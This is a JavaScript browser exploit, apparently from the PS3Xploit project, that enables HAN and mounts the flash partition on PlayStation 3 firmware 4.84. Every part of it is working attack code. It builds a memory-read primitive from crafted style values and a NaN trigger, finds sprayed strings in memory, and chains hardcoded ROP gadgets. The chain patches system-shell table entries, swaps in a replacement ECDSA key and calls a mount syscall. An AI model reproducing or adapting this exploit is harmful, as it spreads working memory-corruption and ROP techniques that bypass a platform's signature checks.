var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="<hr>",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=7256944,ipf2_addr=5272436,flash_partition1="CELL_FS_IOS:BUILTIN_FLSH1",filesystem_fat="CELL_FS_FAT",mount_path_blind="/dev_blind";
document.write('<html><title>PS3Xploit - HAN Enabler + Flash Mounter</title><h1>Enabling HAN & mounting flash...</h1><div id="exploit"></div><div id="trigger"></div></html>');
if(fwv=="4.84"){
var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828,ipf1_addr=7256952,ipf2_addr=5272436;}
function hexh2bin(hex_val)
{
	return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function hexdw2bin(hex_val)
{
	return hexw2bin(0) + hexw2bin(hex_val);
}
String.prototype.toHex16 = function()
{
	return ('0000' + this).substr(-4);
};
String.prototype.toAscii = function(hex_16)
{
    var ascii='';
	var i=0;
	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
	return ascii;
};
String.prototype.convert=function(ascii)
{
	if(this.length<1){return '';}
	var asciistr='';var asciichr='';var i=0;var ret=[];
	if(ascii===true){asciistr = this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    while(i<asciistr.length){
		asciichr = asciistr.substr(i, 4);
		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
		i+=4;
    }
    return ret.join('');
};
String.prototype.convertedSize = function(ascii)
{
	if(this.length<1){return 0;}
	var asciistr='';
	if(ascii===true){asciistr=this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
	return asciistr.length/2;
};
String.prototype.replaceAt=function(index, ch)
{
	return this.substr(0,index)+ch+this.substr(index+ch.length);
};
String.prototype.repeat = function(num)
{
    return new Array(num+1).join(this);
};
Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length===1) {return data[0];}
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign+'0.';
        while(mag++){z+='0';}
        return z+str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) {z += '0';}
    return str + z;
};
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber=0;
	var bits=[];
	var i;
	var j;
	var byte;
	for (i=bytes.length;i;i-=1)
	{
		byte=bytes[i-1];
		for(j=8;j;j-=1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}
function readMemory(address, size)
{
	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
}
function checkMemory(address, size, len)
{
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		return document.getElementById('exploit').style.src.substr(6,len);
	}
}
function trigger(exploit_addr){
	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
}
function load_check()
{
	if(total_loops<max_loops)
	{
		t_out=setTimeout(initROP,1000,false);
	}
	else
	{
		total_loops=0;
		t_out=0;
	}
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	var i=0;
	var t;
	var k;
	var match;
	var exploit_addr;
	while(i<(dat.length*2))
	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			match=0;
			for (k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
				match+=1;
			}
			if (match===exploit_data.length)
			{
				exploit_addr=base+i+4;
				
				for(t=0;t<offset_array.length;t+=1)
				{
					if(offset_array[t]===exploit_addr)
					{
						return -1;
					}
				}
				offset_array.push(exploit_addr);
				return exploit_addr;
			}
		}
		i+=0x10;
	}
	var end_range=base+size;
	return 0;
}
function memcpy(dest,src,len)
{
	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
}
function store_word(store_offset,val,r29out,r30out,r31out)
{
	if(r29out===null){r29out=gtemp_addr;}
	if(r30out===null){r30out=gtemp_addr;}
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function stack_frame_hookup()
{
	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
}
function stack_frame_exit()
{
	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
}
function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
{
	var min_stack_size=0x20; 
	if(r31out===null){r31out=gtemp_addr;}
	if(r31in===null){r31in=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function fill_by_4bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
	return stemp;
}
function fill_by_8bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
	return stemp;
}
function fill_by_16bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
	return stemp;
}
function initDefaults()
{
	offset_array=[];
	xtra_data_addr=0;
	stack_frame_addr=0;
	jump_2_addr=0;
	jump_1_addr=0;
	ps3xploit_ecdsa_key_addr=0;
	index_key_addr=0;
	search_max_threshold=70*0x100000;
	search_base=0x80200000;
	search_size=2*mbytes;
	search_size_ext=0*mbytes;
	search_base_off=0*mbytes;
	total_loops++;
}
function initROP(init)
{
	try
	{
		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
		if(t_out!==0){clearTimeout(t_out);t_out=0;}
		
		initDefaults();
		
		xtra_data=start_x.convert()+ps3xploit_ecdsa_key.convert(true)
		+index_key.convert(true)
		+flash_partition1.convert()
		+filesystem_fat.convert()
		+mount_path_blind.convert()
		+unescape("\uFD7E");

		while(xtra_data_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
			search_max_threshold-=search_size;
		}
		
		
		ps3xploit_ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;
		index_key_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);

		flash_partition1_addr=index_key_addr+index_key.convertedSize(true);
		filesystem_fat_addr=flash_partition1_addr+flash_partition1.convertedSize();
		mount_path_blind_addr=filesystem_fat_addr+14;

		stack_frame=stack_frame_hookup()
		+store_word(toc_entry1_addr, vsh_opd_patch+4)
		+store_word(toc_entry3_addr, vsh_opd_patch+4)
		+store_word(toc_entry5_addr, vsh_opd_patch+4)
		+store_word(ipf1_addr, ipf2_addr)
		+store_word(default_vsh_pub_toc, vsh_ps3xploit_key_toc)
		+memcpy(vsh_ps3xploit_key_toc-0x20, index_key_addr, (index_key.length/2))
		+memcpy(vsh_ps3xploit_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))
		+syscall(0x345,flash_partition1_addr,filesystem_fat_addr,mount_path_blind_addr,0,0,0,0,0)
		+stack_frame_exit();
		
		while(stack_frame_addr===0)
		{
			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
			search_max_threshold-=search_size+search_size_ext;
		}
		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
		while(jump_2_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
		while(jump_1_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		
		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
		var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);
		var j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);
		var j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);
		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
		{
			if(t_out!==0){clearTimeout(t_out);}
			triggerX();
		}
		else
		{
			load_check();
		}
	}
	catch(e)
	{

	}
}
function triggerX()
{
		setTimeout(trigger,1000,jump_1_addr);
		setTimeout(window.close,2000);
		t_out=0;
		total_loops=0;
}
initROP(true);